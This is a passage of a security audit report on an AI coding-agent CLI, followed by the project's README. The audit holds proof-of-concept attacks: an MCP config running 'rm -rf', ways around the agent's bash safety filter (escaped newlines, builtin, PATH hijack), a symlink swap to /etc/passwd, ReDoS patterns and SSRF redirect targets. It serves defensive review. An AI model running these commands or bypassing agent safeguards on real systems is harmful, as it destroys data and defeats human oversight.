\`\`\`typescript
function interpolateString(value: string, sourcePath: string): string {
  return value.replace(/\\\$\\{([A-Z0-9_]+)\\}/gi, (_match, envVar: string) => {
    const resolved = process.env[envVar];
    if (resolved === undefined) {
      logger.warn(\`Missing environment variable \${envVar}...\`);
      return '';
    }
    return resolved;  // ← No redaction if logged elsewhere
  });
}
\`\`\`

**Attack Vector:**

1. Intentionally trigger API errors with valid credentials
2. Monitor log files for leaked credentials
3. Extract API keys from error messages in UI/logs
4. Use credentials for unauthorized API calls

**Risk Assessment:**

- **Impact:** Complete account takeover, unauthorized API usage, data exfiltration
- **Likelihood:** Medium (requires log access or error visibility)
- **Exploitability:** Easy (just trigger API errors)

**Recommended Fix:**

1. Implement credential redaction function for logs:
   - Detect patterns: \`api_key\`, \`secret\`, \`password\`, \`token\`, \`sk-\`, \`pk-\`
   - Redact Bearer tokens
   - Redact x-api-key headers
2. Never stringify full API error responses
3. Extract and sanitize only error messages
4. Implement allowlist for interpolatable variables
5. Add pre-commit hooks to prevent credential commits

**Implementation Reference:** \`SECURITY_FIXES.md:75-153\`

---

### 3. HIGH: Incomplete ReDoS (Regular Expression Denial of Service) Protection

**Severity:** HIGH  
**Type:** Denial of Service  
**CVSS Score:** 7.5  
**Affected Files:**
- \`src/tools/search-files.ts:85-87, 196-203\`

**Description:**

While the code validates pattern length (max 1000 chars), it doesn't validate regex complexity:

\`\`\`typescript
if (searchTerm.length > MAX_PATTERN_LENGTH) {
  return \`Error: Pattern too long...\`;
}
// ... later
let regex: RegExp;
try {
  regex = new RegExp(searchTerm, flags);
} catch (error) {
  const message = error instanceof Error ? error.message : String(error);
  return \`Error: invalid regex pattern...\`;
}
\`\`\`

**Attack Vector:**

User-supplied regex patterns with catastrophic backtracking:
- \`(a+)+b\` - nested quantifiers
- \`(a|a)*b\` - alternation
- \`(a*)*b\` - recursive quantifiers
- \`^(a|a)*\$\` - anchored backtracking

**Proof of Concept:**

\`\`\`bash
# Pattern causes exponential backtracking
searchFiles("(a+)+b" + "a".repeat(50))
# On input without match: 2^50 attempts ≈ hangs indefinitely
\`\`\`

**Risk Assessment:**

- **Impact:** Complete service disruption, application hang
- **Likelihood:** High (easy to craft malicious regex)
- **Exploitability:** Easy (just provide regex pattern)

**Recommended Fix:**

1. Use \`safe-regex\` library to validate complexity before compilation
2. Implement per-operation timeout (5-10 seconds max)
3. Run regex matching in worker thread if available
4. Add complexity metrics and limits
5. Consider using ripgrep exclusively (already integrated, more secure)

**Implementation Reference:** \`SECURITY_FIXES.md:157-216\`

---

### 4. HIGH: Insufficient Symlink Resolution in Path Validation

**Severity:** HIGH  
**Type:** Directory Traversal / Symlink Escape (TOCTOU Race Condition)  
**CVSS Score:** 7.5  
**Affected Files:**
- \`src/utils/path-validation.ts:48-80\`

**Description:**

While the code has symlink checks, there are race condition and incomplete coverage issues:

\`\`\`typescript
export async function validatePath(requestedPath: string): Promise<string> {
  const resolved = path.resolve(workingDirectory, requestedPath);
  const normalized = path.normalize(resolved);

  if (!isAllowedPath(normalized)) {
    throw new Error(\`Path outside working directory.\`);
  }

  try {
    const realPath = await fs.realpath(normalized);  // ← Check happens here
    if (!isAllowedPath(realPath)) {
      throw new Error(\`Path resolves outside working directory.\`);
    }
    return realPath;  // ← But actual file operation happens later
  } catch (err: any) {
    if (err.code === 'ENOENT') {
      const parentDir = path.dirname(normalized);
      const realParent = await fs.realpath(parentDir);
      if (!isAllowedPath(realParent)) {
        throw new Error(\`Parent directory resolves outside...\`);
      }
      return path.join(realParent, path.basename(normalized));  // ← Time-of-check to time-of-use gap
    }
  }
}
\`\`\`

**Issues:**

1. **TOCTOU Race Condition:** Between realpath check (line 59) and actual file operation, symlinks could be changed
2. **Incomplete Parent Validation:** When creating new files, only parent is validated. A symlink in the parent could escape.
3. **No Mount Point Checks:** Symlinks could point to different filesystems
4. **No O_NOFOLLOW Usage:** System calls don't use O_NOFOLLOW flag

**Attack Scenario:**

1. Create symlink: \`link → /tmp/allowed_dir/file\`
2. Call \`validatePath("link")\` - returns OK
3. Before file operation, attacker changes: \`link → /etc/passwd\`
4. File operation now operates on \`/etc/passwd\`

**Risk Assessment:**

- **Impact:** Directory traversal bypass, unauthorized file access/modification
- **Likelihood:** Medium (requires precise timing, but deterministic in some scenarios)
- **Exploitability:** Moderate (requires symlink setup and timing)

**Recommended Fix:**

1. Use \`open()\` with \`O_NOFOLLOW\` flag for all file operations
2. Verify path is still valid immediately before each operation (not just once)
3. Add mount point validation
4. Use atomic file operations with proper flags
5. Consider using Node.js built-in flags when available

**Implementation Reference:** \`SECURITY_FIXES.md:220-295\`

---

### 5. MEDIUM: Insufficient Validation of MCP Server Commands

**Severity:** MEDIUM  
**Type:** Command Injection / Configuration Validation  
**CVSS Score:** 5.3  
**Affected Files:**
- \`src/runtime-config.ts:36-52\`
- \`src/mcp.ts:52-92\`

**Description:**

MCP server configuration accepts arbitrary command and args without validation:

\`\`\`typescript
interface StdioServerConfig {
  type: 'stdio';
  command: string;        // ← No validation
  args?: string[];        // ← No validation
  env?: Record<string, string>;
  cwd?: string;
  enabled?: boolean;
  timeoutMs?: number;
}
\`\`\`

No validation that:
1. The command exists or is a legitimate MCP server
2. Arguments don't contain shell metacharacters
3. The cwd is valid
4. The command is from a trusted source

**Proof of Concept:**

\`\`\`jsonc
{
  "mcp": {
    "servers": {
      "rogue": {
        "type": "stdio",
        "command": "sh",
        "args": ["-c", "rm -rf /important && echo 'pwned'"]
      }
    }
  }
}
\`\`\`

**Risk Assessment:**

- **Impact:** Arbitrary command execution
- **Likelihood:** Medium (requires config modification)
- **Exploitability:** Easy (straightforward JSON manipulation)

**Recommended Fix:**

1. Validate command path existence before execution
2. Validate args are simple strings without shell metacharacters
3. Whitelist known/trusted MCP servers
4. Add command execution warnings in UI
5. Validate cwd is within allowed paths
6. Log all MCP server executions for audit trail

**Implementation Reference:** \`SECURITY_FIXES.md:299-350\`

---

### 6. MEDIUM: Weak Bash Command Filtering

**Severity:** MEDIUM  
**Type:** Unsafe Blocklist Bypass  
**CVSS Score:** 5.3  
**Affected Files:**
- \`src/tools/bash.ts:46-55, 103-131\`

**Description:**

The bash safety filter uses a blocklist of tokens but has potential bypasses:

\`\`\`typescript
const SHELL_CONTROL_PATTERN = /(^|[^\\\\])(?:;|&&|\\|\\||\\||>|<|\`|\\\$\\(|\\*|\\?)/;
const UNSAFE_BASH_TOKENS = new Set([
  'cat', 'head', 'tail', 'grep', 'rg', 'find', 'awk', 'sed', ...
]);
\`\`\`

**Potential Bypasses:**

1. **Alias Bypass:** \`alias cat=less\` then safe \`ls\` could be diverted
2. **Builtin Override:** Commands like \`builtin cat\` or \`.\` sourcing
3. **Incomplete Token Check:** Only checks first word, not composed commands
4. **Escaped Newlines:**
   \`\`\`bash
   pwd \\
   rm -rf /
   \`\`\`
5. **Command Substitution Edge Cases:** \`pwd\$(whoami)\` contains \`\$(\` but not directly

**Attack Scenarios:**

\`\`\`bash
# Bypass 1: Escaped newline
pwd \\
rm -rf /

# Bypass 2: Builtin override
builtin cat /sensitive/file

# Bypass 3: Environment variable manipulation  
export PATH=/tmp:\$PATH
# Then put malicious 'ls' in /tmp
ls  # Calls malicious /tmp/ls instead of /bin/ls
\`\`\`

**Risk Assessment:**

- **Impact:** Execution of dangerous commands, data destruction, privilege escalation
- **Likelihood:** Low to Medium (requires understanding of bypass techniques)
- **Exploitability:** Moderate (some bypasses are complex)

**Recommended Fix:**

1. Switch from blocklist to allowlist for safe commands
2. Require explicit \`--dangerously-skip-permissions\` flag for any shell composition
3. Parse shell AST instead of regex patterns
4. Use \`set -u\` (unset variables error) and disable builtins in spawned process
5. Filter environment variables passed to bash processes
6. Use Node's \`execFileSync()\` style approach for safer execution

**Implementation Reference:** \`SECURITY_FIXES.md:354-434\`

---

### 7. MEDIUM: Missing Validation on URL Redirect Targets

**Severity:** MEDIUM  
**Type:** Open Redirect leading to SSRF (Server-Side Request Forgery)  
**CVSS Score:** 5.3  
**Affected Files:**
- \`src/tools/webfetch.ts:203-235\`

**Description:**

The webfetch tool limits redirects but doesn't validate redirect targets:

\`\`\`typescript
while (redirectCount < MAX_REDIRECTS) {
  const response = await originalFetch(currentUrl, {
    signal,
    headers: FETCH_HEADERS,
    redirect: "manual",
  });

  if (response.status >= 300 && response.status < 400) {
    const location = response.headers.get("location");
    if (location) {
      redirectCount++;
      currentUrl = new URL(location, currentUrl).href;  // ← No validation!
      continue;
    }
  }
}
\`\`\`

**Attack Vector:**

An attacker-controlled website could redirect to:
1. \`file://\` URLs - read local files
2. \`http://localhost:*\` - access internal services
3. \`http://127.0.0.1:*\` - internal API access
4. \`http://192.168.0.1\` - internal network scan
5. \`gopher://\` or other protocols - protocol attacks

**Risk Assessment:**

- **Impact:** Information disclosure, unauthorized access to internal services
- **Likelihood:** Medium (requires user to click attacker link)
- **Exploitability:** Easy (just return redirect header)

**Recommended Fix:**

1. Validate redirect URLs are HTTPS/HTTP only
2. Reject localhost/127.0.0.1 addresses
3. Reject private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
4. Log all redirects for user awareness
5. Provide user option to disable auto-redirects
6. Reject attempts to change protocol mid-redirect

**Implementation Reference:** \`SECURITY_FIXES.md:439-519\`

---

### 8. MEDIUM: Insufficient Input Validation in Edit File Fuzzy Matching

**Severity:** MEDIUM  
**Type:** Resource Exhaustion / Memory Explosion  
**CVSS Score:** 5.3  
**Affected Files:**
- \`src/tools/edit-file.ts:292-428\`

**Description:**

While well-designed, the fuzzy matching strategies lack size limits:

\`\`\`typescript
function lineTrimmedReplacer(content, oldString) {
  const searchLines = oldString.split('\\n').map(l => l.trim());
  const contentLines = content.split('\\n');

  for (let i = 0; i <= contentLines.length - searchLines.length; i++) {
    let match = true;
    for (let j = 0; j < searchLines.length; j++) {
      if (contentLines[i + j].trim() !== searchLines[j]) {
        match = false;
        break;
      }
    }
  }
}
\`\`\`

**Issues:**

1. **Memory Explosion:** Very large \`oldString\` with many lines causes O(n*m) memory usage
2. **No Size Limits:** Unlike \`search-files.ts\` with MAX_PATTERN_LENGTH, edit file has none
3. **String Allocation:** Many intermediate string objects created during matching
4. **No Timeout:** Unlike bash/webfetch, edit operations lack execution timeout

**Attack Scenario:**

\`\`\`typescript
editFile(
  "file.txt",
  "\\n".repeat(1_000_000),  // 1M lines
  "replacement"
)
\`\`\`

This would allocate gigabytes of memory, causing:
- Out of memory crash
- System slowdown
- Denial of service

**Risk Assessment:**

- **Impact:** Denial of service via memory exhaustion
- **Likelihood:** Low to Medium (easy to trigger but detected)
- **Exploitability:** Easy (just provide large input)

**Recommended Fix:**

1. Add MAX_OLD_STRING_LENGTH constant (e.g., 50KB)
2. Add MAX_OLD_STRING_LINES constant (e.g., 1000 lines)
3. Add timeout for edit operations (10 seconds)
4. Implement streaming comparison for very large files
5. Return error instead of hanging on oversized input

**Implementation Reference:** \`SECURITY_FIXES.md:523-558\`

---

### 9. MEDIUM: Lack of Rate Limiting for File Operations

**Severity:** MEDIUM  
**Type:** Denial of Service / Resource Exhaustion  
**CVSS Score:** 5.3  
**Affected Files:**
- \`src/tools/read-file.ts\`
- \`src/tools/write-file.ts\`
- \`src/tools/search-files.ts\`
- \`src/tools/list-directory.ts\`
- \`src/tools/edit-file.ts\`

**Description:**

While bash and webfetch have timeouts, file operations have no rate limiting:

- No throttling on concurrent read_file operations
- No limit on total bytes read per session
- No limit on file write frequency
- No check for rapid repeated operations

**Attack Scenarios:**

1. **Repeated Reads:** Loop reading huge files repeatedly to exhaust memory
2. **Disk Exhaustion:** Rapid write operations fill disk space
3. **Parallel Reads:** Call read_file with multiple large files in parallel
4. **Memory Exhaustion:** Exhaust available RAM through cumulative reads

**Example Attack:**

\`\`\`typescript
// Called in tight loop
for (let i = 0; i < 10000; i++) {
  readFile("/path/to/1GB/file");  // 10GB total reads
}
\`\`\`

**Risk Assessment:**

- **Impact:** Service disruption, system resource exhaustion
- **Likelihood:** Medium (requires multiple tool calls)
- **Exploitability:** Easy (just loop operations)

**Recommended Fix:**

1. Add per-session byte read/write quotas
2. Implement operation rate limiting (e.g., max 10 ops/sec)
3. Add cooldown between identical operations
4. Track cumulative resource usage across session
5. Expose limits to user in session info
6. Implement progressive backoff on rate limit

**Implementation Priority:** Medium (3-4 hours to implement)

---

### 10. MEDIUM: Incomplete Credential Masking in CLI Output

**Severity:** MEDIUM  
**Type:** Sensitive Data Exposure  
**CVSS Score:** 5.3  
**Affected Files:**
- \`src/config.tsx:307\`
- \`src/cli.tsx:77-82\`

**Description:**

While API keys are masked in some places, the masking is inconsistent:

\`\`\`typescript
// Good - masked in config display
<Text>  API Key: {'*'.repeat(8)}</Text>

// But potentially exposed in other places:
console.log(resultPath);  // Could contain config path with visible key
console.error(error);     // Error might contain full config
JSON.stringify(config);   // Full serialization could leak keys
\`\`\`

**Risk Assessment:**

- **Impact:** Credential exposure in terminal output
- **Likelihood:** Low to Medium (requires monitoring terminal output)
- **Exploitability:** Easy (just observe output)

**Recommended Fix:**

1. Implement global credential filter for all console output
2. Use regex to detect and mask common credential patterns:
   - \`api_key\`, \`apikey\`, \`secret\`, \`password\`, \`token\`
   - OpenAI: \`sk-*\`
   - Anthropic: \`sk-*\`
   - Gemini: \`AIza*\`
3. Review all logging for credential leakage
4. Implement output sanitization middleware
5. Add pre-commit hooks to detect credential patterns

---

### 11. LOW: Insufficient Protection Against Malicious Log Files

**Severity:** LOW  
**Type:** Log Injection / Potential UI Escape  
**CVSS Score:** 3.3  
**Affected Files:**
- \`src/utils/logger.ts:57-152\`

**Description:**

Tool output is logged without sanitization and could contain ANSI escape codes:

\`\`\`typescript
function log(level: LogLevel, label: string, message: string, context?: Record<string, unknown>): void {
  const ctx = context ? \` \${safeStringify(context)}\` : '';
  writeToFile(\`[\${ts}] \${label.padEnd(5)} \${message}\${ctx}\\n\`);  // ← No ANSI sanitization
}
\`\`\`

**Attack Vector:**

Malicious tool could return:
1. ANSI escape sequences to modify terminal colors/style
2. Terminal control sequences (e.g., \`\\x1b[2J\` to clear screen)
3. Cursor positioning codes
4. Bell sequences (\`\\x07\`)

**Risk Assessment:**

- **Impact:** Visual confusion, potential UI manipulation
- **Likelihood:** Low (requires malicious tool output)
- **Exploitability:** Easy (return escape sequences)

**Recommended Fix:**

1. Sanitize ANSI escape sequences from tool output
2. Validate message doesn't contain control characters (< 0x20 except \\n\\r\\t)
3. Use \`strip-ansi\` library or equivalent
4. Consider disabling ANSI codes in log file entirely
5. Escape control characters in JSON serialization

---

### 12. LOW: Unvalidated Custom Headers from Environment Variables

**Severity:** LOW  
**Type:** HTTP Header Injection  
**CVSS Score:** 3.3  
**Affected Files:**
- \`src/config.tsx:56-70\`
- \`src/App.tsx:370-380\`

**Description:**

Custom headers loaded from environment variables aren't validated:

\`\`\`typescript
if (process.env.PROTOAGENT_CUSTOM_HEADERS) {
  return 'none';  // But headers are used without format validation
}
\`\`\`

**Risk Assessment:**

- **Impact:** Injection of HTTP headers with newlines (header splitting)
- **Likelihood:** Very Low (requires control over environment)
- **Exploitability:** Moderate (requires specific payload crafting)

**Recommended Fix:**

1. Validate header names against HTTP spec (token characters only)
2. Reject headers with newlines, carriage returns, or control characters
3. Whitelist allowed custom headers
4. Parse headers carefully to prevent injection
5. Document security implications

---

### 13. LOW: Information Disclosure - .env File in Repository

**Severity:** LOW  
**Type:** Credential Exposure  
**CVSS Score:** 3.3  
**Affected Files:**
- \`.env\`

**Description:**

The \`.env\` file in the repository root contains placeholder credentials:

\`\`\`
OPENAI_API_KEY=your_key_here
GEMINI_API_KEY=your_key_here
ANTHROPIC_API_KEY=your_key_here
\`\`\`

**Status:** ✓ MITIGATED
- \`.env\` file is in \`.gitignore\`
- \`.env\` is NOT tracked in git (\`git ls-files\` confirms absence)
- Placeholder values only (no real credentials exposed)

**Residual Risk:**

While this is properly ignored, it could:
1. Train developers to put real credentials here
2. Accidentally get committed with real credentials if .gitignore is modified
3. Serve as an attack surface if repository is cloned

**Recommended Fix:**

1. ✓ Keep \`.env\` in \`.gitignore\` (already done)
2. Rename to \`.env.example\` with template and comments
3. Add pre-commit hook to prevent .env commits
4. Document in README to use environment variables only
5. Add warning on first run if .env contains real credentials

---

### 14. MEDIUM: Dependency Vulnerability Exposure

**Severity:** MEDIUM  
**Type:** Third-party Vulnerability Exposure  
**CVSS Score:** 5.0  
**Affected Packages:**
- \`minimatch\` ≤ 3.1.3 - ReDoS via repeated wildcards (HIGH)
- \`rollup\` 4.0.0-4.58.0 - Arbitrary File Write via Path Traversal (HIGH)
- \`undici\` ≤ 6.23.0 - Unbounded decompression, HTTP smuggling (HIGH)

**Current Status:**

\`\`\`
5 vulnerabilities (1 moderate, 4 high)
\`\`\`

ProtoAgent vulnerabilities:
- \`minimatch\` - HIGH ReDoS
- \`rollup\` - HIGH File Write
- \`undici\` - HIGH (multiple)

**Risk Assessment:**

- **Impact:** Varies by vulnerability (DoS, path traversal, memory exhaustion)
- **Likelihood:** Medium (depends on how dependencies are used)
- **Exploitability:** Varies

**Recommended Fix:**

1. Run \`npm audit fix\` to update vulnerable dependencies
2. Update to latest versions:
   - \`minimatch\`: ≥ 3.1.4
   - \`rollup\`: ≥ 4.58.1
   - \`undici\`: ≥ 6.23.1
3. Set up Dependabot or Renovate for automated updates
4. Implement security testing in CI/CD
5. Use \`npm ci\` instead of \`npm install\` for reproducibility

---

## COMPARISON WITH PI-MONO CODEBASE

### ProtoAgent vs Pi-Mono Vulnerability Comparison

| Category | ProtoAgent | Pi-Mono | Status |
|----------|-----------|---------|--------|
| **Total Vulnerabilities** | 14 | 14 | Same count |
| **Critical** | 1 | Unknown | - |
| **High** | 3 | 4 | Pi-Mono has more |
| **Medium** | 7 | 7 | Same count |
| **Low** | 3 | 3 | Same count |

### Shared Vulnerabilities Between Codebases

#### 1. Dependency Vulnerabilities
Both projects have vulnerable dependencies:

**ProtoAgent:**
- minimatch ReDoS (HIGH)
- rollup path traversal (HIGH)
- undici HTTP issues (HIGH)

**Pi-Mono:**
- fast-xml-parser Entity Expansion (HIGH)
- undici HTTP issues (HIGH)
- file-type infinite loop (MODERATE)

**Shared:** \`undici\` vulnerabilities
- HTTP Request/Response Smuggling
- Unbounded Memory Consumption in WebSocket decompression
- Unhandled Exception in WebSocket Client
- CRLF Injection

### Vulnerabilities Unique to ProtoAgent

1. **MCP Environment Variable Sanitization (CRITICAL)**
   - Risk: Remote Code Execution
   - Root cause: MCP-specific architecture
   - Not applicable to Pi-Mono

2. **API Keys in Error Logs (HIGH)**
   - Risk: Credential exposure
   - Root cause: LLM provider integration
   - Related to ProtoAgent's API client design

3. **ReDoS in Regex (HIGH)**
   - Risk: Denial of Service
   - Root cause: Custom regex search implementation
   - Pi-Mono likely uses ripgrep or equivalent

4. **Symlink Race Conditions (HIGH)**
   - Risk: Directory traversal bypass
   - Root cause: Custom path validation
   - Both projects likely have this but may have fixed in Pi-Mono

5. **MCP Command Injection (MEDIUM)**
   - Risk: Arbitrary command execution
   - Root cause: MCP server configuration
   - Unique to ProtoAgent

### Vulnerabilities Likely Unique to Pi-Mono

Based on npm audit results:

1. **fast-xml-parser Entity Expansion (HIGH)**
   - Risk: XML Bomb / Billion Laughs
   - Root cause: XML parsing for AWS SDK
   - ProtoAgent doesn't use AWS SDK or XML parsing

2. **file-type DoS Vulnerabilities (MODERATE)**
   - Risk: Infinite loop on malformed files
   - Root cause: File type detection
   - ProtoAgent doesn't have file type detection

3. Additional HIGH severity dependencies (4 vs 3)
   - Pi-Mono may have different dependency tree

### Shared Vulnerability Patterns

Both projects should address:

1. **Credential Management:**
   - Both need better credential redaction in logs
   - Both should prevent .env file commits

2. **Input Validation:**
   - Both need stronger input validation
   - Both need size limits on operations

3. **Resource Limits:**
   - Neither has rate limiting implemented
   - Both vulnerable to resource exhaustion

4. **Dependency Security:**
   - Both have vulnerable dependencies
   - Both need automated dependency updates

---

## SEVERITY ASSESSMENT METHODOLOGY

Severity ratings based on:

| Factor | Weight | Explanation |
|--------|--------|-------------|
| **Impact** | 40% | Potential damage if exploited |
| **Likelihood** | 35% | Probability of real-world exploitation |
| **Exploitability** | 25% | Ease of weaponization |

### Severity Mapping

- **CRITICAL:** Impact + Likelihood + Exploitability = 85%+ (immediate action required)
- **HIGH:** 70-84% (fix within 2 weeks)
- **MEDIUM:** 50-69% (fix within 1 month)
- **LOW:** <50% (fix when convenient)

---

## REMEDIATION ROADMAP

### Phase 1: CRITICAL (Week 1)
**Effort: 8-16 hours**

1. **MCP Environment Variable Sanitization** (4 hours)
   - Implement whitelist for allowed env vars
   - Validate values for safe characters
   - Test with malicious configurations

### Phase 2: HIGH (Week 2)
**Effort: 16-24 hours**

2. **API Key Credential Redaction** (6 hours)
   - Implement redaction function
   - Add to logger and error handlers
   - Test with real API errors

3. **ReDoS Protection** (4 hours)
   - Add safe-regex library
   - Validate patterns before compilation
   - Add timeout for regex operations

4. **Symlink Race Condition Fixes** (6-8 hours)
   - Use O_NOFOLLOW flags
   - Implement pre-operation verification
   - Add atomic operation support

### Phase 3: MEDIUM (Weeks 3-4)
**Effort: 24-32 hours**

5. **MCP Command Validation** (4 hours)
6. **Bash Command Filter Hardening** (6 hours)
7. **URL Redirect Validation** (4 hours)
8. **Edit File Size Limits** (3 hours)
9. **Rate Limiting Implementation** (6 hours)
10. **Credential Masking Consistency** (2 hours)

### Phase 4: LOW (As needed)
**Effort: 8-12 hours**

11. **Log Output Sanitization** (3 hours)
12. **Custom Header Validation** (2 hours)
13. **Dependency Updates** (4-6 hours)
14. **.env File Documentation** (1 hour)

**Total Estimated Effort:** 64-104 engineering hours (2-3 weeks)

---

## TESTING STRATEGY

### Unit Tests
- Test each fix in isolation
- Verify legitimate use cases still work
- Test boundary conditions

### Integration Tests
- Test interaction between security layers
- Test approval system with various command types
- Test path validation with symlinks

### Security Tests (Fuzzing)
- Malformed configurations
- Large/oversized inputs
- Malicious environment variables
- Symlink attack scenarios
- ReDoS patterns

### Penetration Testing
- Attempt privilege escalation
- Attempt sandbox escape
- Attempt credential theft
- Attempt resource exhaustion

---

## SECURITY BEST PRACTICES TO IMPLEMENT

### Immediate
1. Add SECURITY.md documenting threat model
2. Create security.txt for responsible disclosure
3. Implement pre-commit hooks for secret detection
4. Add automated dependency scanning

### Short-term
5. Implement audit logging for sensitive operations
6. Add security questions to pull request template
7. Establish code review process with security focus
8. Document all security assumptions

### Long-term
9. Conduct quarterly security reviews
10. Implement continuous security testing
11. Add security metrics to CI/CD
12. Establish bug bounty program

---

## POSITIVE SECURITY OBSERVATIONS

ProtoAgent demonstrates strong security fundamentals:

✓ **Path Validation Excellence**
- Comprehensive directory traversal checks
- Good understanding of symlink issues
- Multiple validation layers

✓ **Approval System Design**
- Three-tier security model is well-thought-out
- Hard-blocked, auto-approved, interactive layers
- Proper logging of approvals

✓ **Configuration Security**
- File permission hardening (0o600/0o700)
- Proper .env handling and gitignoring
- Schema validation for configs

✓ **Timeout Protection**
- Comprehensive timeouts on external operations
- Prevents resource exhaustion
- Proper cleanup on timeout

✓ **Regex Safety**
- Integration with ripgrep for safer operations
- Fallback to safe JS implementation
- Good awareness of ReDoS risks

✓ **No Critical Code Execution Issues**
- No eval()/Function() usage
- No SQL injection (not database app)
- No direct command interpolation in critical paths

---

## CONCLUSION

ProtoAgent is well-architected with thoughtful security practices. The identified vulnerabilities are primarily in:
- Advanced attack scenarios
- Configuration validation edge cases
- Timing-sensitive race conditions
- Resource exhaustion possibilities

**Risk Classification:** The project is suitable for:
- ✓ Educational use
- ✓ Trusted environments
- ✗ Production use in sensitive environments (until critical/high issues are fixed)
- ✗ Untrusted contexts (until all issues are addressed)

**Comparison to Pi-Mono:**
- Similar overall vulnerability count (14 each)
- ProtoAgent has more critical issues (MCP-specific)
- Pi-Mono has more dependency vulnerabilities (AWS SDK-related)
- Both projects would benefit from the same defensive measures

**Recommended Next Steps:**
1. Prioritize and assign Phase 1-2 fixes to development team
2. Implement automated security testing in CI/CD
3. Add security section to CONTRIBUTING.md
4. Establish responsible disclosure policy
5. Consider security audit before production deployment

---

## APPENDICES

### A. File Structure of Analyzed Codebase

\`\`\`
protoagent/
├── src/
│   ├── tools/
│   │   ├── bash.ts (233 lines)
│   │   ├── search-files.ts (290 lines)
│   │   ├── edit-file.ts
│   │   ├── read-file.ts
│   │   ├── write-file.ts
│   │   ├── webfetch.ts (385 lines)
│   │   └── ...
│   ├── utils/
│   │   ├── path-validation.ts (84 lines)
│   │   ├── approval.ts
│   │   ├── logger.ts
│   │   └── ...
│   ├── mcp.ts (230 lines)
│   ├── runtime-config.ts
│   ├── agentic-loop.ts
│   ├── config.tsx (597 lines)
│   └── cli.tsx (119 lines)
├── package.json
├── .env (placeholder)
├── .gitignore
└── SECURITY_AUDIT_REPORT.md
\`\`\`

### B. Security Testing Checklist

- [ ] Test MCP config with malicious env vars
- [ ] Test API error logging for credential leaks
- [ ] Test ReDoS patterns on search function
- [ ] Test symlink race conditions
- [ ] Test MCP command injection
- [ ] Test bash command bypasses
- [ ] Test URL redirect to internal IPs
- [ ] Test edit file with massive strings
- [ ] Test file operation rate limiting
- [ ] Test credential masking in all outputs
- [ ] Test log injection vectors
- [ ] Test custom header injection
- [ ] Verify .env not in git
- [ ] Run npm audit on all dependencies

### C. References & Standards

- **OWASP Top 10:** A01:2021 - Broken Access Control, A06:2021 - Vulnerable Components
- **CWE:** CWE-22 (Path Traversal), CWE-78 (OS Command Injection), CWE-200 (Sensitive Data Exposure)
- **CVSS v3.1:** Scoring methodology used for severity assessment
- **Node.js Security Best Practices:** https://nodejs.org/en/docs/guides/security/
- **OWASP Secure Coding:** https://cheatsheetseries.owasp.org/

---

**Report Generated:** March 22, 2026  
**Analysis Tool:** Comprehensive Security Vulnerability Assessment  
**Confidence Level:** High (based on source code analysis + existing audit reports)
`,
  },
  {
    path: "README.md",
    content: `\`\`\`
█▀█ █▀█ █▀█ ▀█▀ █▀█ ▄▀█ █▀▀ █▀▀ █▄ █ ▀█▀
█▀▀ █▀▄ █▄█  █  █▄█ █▀█ █▄█ ██▄ █ ▀█  █
\`\`\`

A minimal, educational AI coding agent CLI written in TypeScript. It stays small enough to read in an afternoon, but it still has the core pieces you expect from a real coding agent: a streaming tool-use loop, approvals, sessions, MCP, skills, sub-agents, and cost tracking.

## Features

- **Multi-provider chat** — OpenAI, Anthropic, Google Gemini, and Cerebras via the OpenAI SDK
- **Built-in tools** — Read, write, edit, list, search, run shell commands, manage todos, and fetch web pages with \`webfetch\`
- **Approval system** — Inline confirmation for file writes, file edits, and non-safe shell commands
- **Session persistence** — Conversations and TODO state are saved automatically and can be resumed with \`--session\`
<!-- - **Dynamic extensions** — Load skills on demand and add external tools through MCP servers -->
- **Sub-agents** — Delegate self-contained tasks to isolated child conversations
- **Usage tracking** — Live token, context, and estimated cost display in the TUI

## Quick Start

\`\`\`bash
npm install -g protoagent
protoagent
\`\`\`

On first run, ProtoAgent shows an inline setup flow where you pick a provider/model pair and enter an API key. ProtoAgent stores that selection in \`protoagent.jsonc\`.

Runtime config lookup is simple:

- if \`<cwd>/.protoagent/protoagent.jsonc\` exists, ProtoAgent uses it
- otherwise it falls back to the shared user config at \`~/.config/protoagent/protoagent.jsonc\` on macOS/Linux and \`~/AppData/Local/protoagent/protoagent.jsonc\` on Windows

You can also run the standalone wizard directly:

\`\`\`bash
protoagent configure
\`\`\`

Or configure a specific target non-interactively:

\`\`\`bash
protoagent configure --project --provider openai --model gpt-5-mini
protoagent configure --user --provider anthropic --model claude-sonnet-4-6
\`\`\`

To create a runtime config file for the current project or your shared user config, run:

\`\`\`bash
protoagent init
\`\`\`

\`protoagent init\` creates \`protoagent.jsonc\` in either \`<cwd>/.protoagent/protoagent.jsonc\` or your shared user config location and prints the exact path it used.

For scripts or non-interactive setup, use:

\`\`\`bash
protoagent init --project
protoagent init --user
protoagent init --project --force
\`\`\`

## Interactive Commands

- \`/help\` — Show available slash commands
- \`/collapse\` — Collapse long system and tool output
- \`/expand\` — Expand collapsed messages
- \`/quit\` or \`/exit\` — Save and exit

Other useful shortcuts:

- \`Esc\` — Abort the current in-flight completion
- \`Ctrl-C\` — Exit immediately

## Building From Source

\`\`\`bash
npm install
npm run build
npm run dev
\`\`\`

## Documentation

Full guides and tutorials live in \`docs/\`:

- \`docs/guide/getting-started.md\`
- \`docs/guide/configuration.md\`
- \`docs/guide/tools.md\`
- \`docs/guide/sessions.md\`
- \`docs/guide/skills.md\`
- \`docs/guide/sub-agents.md\`
- \`docs/guide/mcp.md\`

Build the docs site locally:

\`\`\`bash
npm run docs:dev
npm run docs:build
\`\`\`

Top-level technical references:

- \`SPEC.md\` — current implementation specification
- \`ARCHITECTURE.md\` — current runtime architecture and module relationships

## Architecture

The codebase is organized so each part is easy to trace:

- \`src/cli.tsx\` — CLI flags and the \`configure\` subcommand
- \`src/App.tsx\` — Ink app shell, runtime orchestration, slash commands, approvals, session display
- \`src/agentic-loop.ts\` — Streaming tool-use loop and error handling
- \`src/tools/\` — Built-in tools such as file I/O, shell, todo tracking, and \`webfetch\`
- \`src/config.tsx\` — Config persistence and setup wizard
- \`src/providers.ts\` — Provider/model catalog and pricing metadata
- \`src/sessions.ts\` — Session save/load and TODO persistence
- \`src/skills.ts\` — Skill discovery and dynamic \`activate_skill\` tool registration
- \`src/mcp.ts\` — MCP server loading and dynamic tool registration
- \`src/sub-agent.ts\` — Isolated child agent execution

## Supported Providers

### OpenAI
- GPT-5.2
- GPT-5 Mini
- GPT-4.1

### Anthropic Claude
- Claude Opus 4.6
- Claude Sonnet 4.6
- Claude Haiku 4.5

### Google Gemini
- Gemini 3 Flash (Preview)
- Gemini 3 Pro (Preview)
